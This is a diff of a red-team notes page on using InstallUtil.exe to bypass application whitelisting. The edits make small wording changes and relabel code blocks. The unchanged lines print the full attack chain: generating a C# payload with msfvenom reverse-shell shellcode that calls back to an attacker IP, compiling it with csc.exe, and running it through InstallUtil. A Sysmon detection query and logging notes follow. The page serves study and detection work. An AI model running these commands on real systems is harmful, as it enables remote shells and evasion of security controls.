@@ -6,11 +6,11 @@ description: InstallUtil code execution - bypass application whitelisting.
 
 ## Execution
 
-First of, generate a C\# payload \(with [InstallUtil script](https://github.com/khr0x40sh/WhiteListEvasion)\) that contains shellcode from msfvenom and upload the temp.cs file to victim's machine:
+First of, let's generate a C\# payload \(with [InstallUtil script](https://github.com/khr0x40sh/WhiteListEvasion)\) that contains shellcode from msfvenom and upload the temp.cs file to victim's machine:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@local" %}
-```python
+```csharp
 python InstallUtil.py --cs_file temp.cs --exe_file temp.exe --payload windowsreverse_shell_tcp --lhost 10.0.0.5 --lport 443
 ```
 {% endcode-tabs-item %}
@@ -20,7 +20,7 @@ Compile the .cs to an .exe:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@victim" %}
-```bash
+```csharp
 PS C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\csc.exe C:\experiments\installUtil\temp.cs
 ```
 {% endcode-tabs-item %}
@@ -30,7 +30,7 @@ Execute the payload:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@victim" %}
-```bash
+```csharp
 PS C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Microsoft.NET\Framework\v4.0.30319\temp.exe
 Microsoft (R) .NET Framework Installation utility Version 4.0.30319.17929
 Copyright (C) Microsoft Corporation.  All rights reserved.
@@ -67,7 +67,7 @@ event_data.ParentCommandLine:"*installutil.exe*" && event_data.Image:cmd.exe
 What is interesting is that I could not see an established network connection logged in sysmon logs, although I could see other network connections from the victim machine being logged.
 
 {% hint style="danger" %}
-Will be coming back to this one for further inspection. Need to review the sysmon configuration.
+Will be coming back to this one for further inspection - possibly related to sysmon configuration.
 {% endhint %}
 
 {% embed url="https://attack.mitre.org/wiki/Technique/T1118" %}
